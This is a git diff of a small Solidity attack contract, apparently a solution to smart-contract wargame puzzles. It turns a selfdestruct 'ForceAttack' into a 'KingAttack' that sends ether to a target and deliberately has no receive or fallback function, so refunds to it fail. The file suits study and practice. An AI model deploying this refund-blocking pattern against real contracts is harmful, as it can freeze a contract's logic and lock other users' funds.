@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract ForceAttack {
+contract KingAttack {
     address public target;
 
     constructor(address _target) {
@@ -10,6 +10,9 @@ contract ForceAttack {
 
     function attack() public payable {
         address payable addr = payable(address(target));
-        selfdestruct(addr);
+        (bool success, ) = addr.call{value: msg.value}("");
+        require(success, "call failed");
     }
+
+    // just reject to receive funds. (no fallback or receive function)
 }
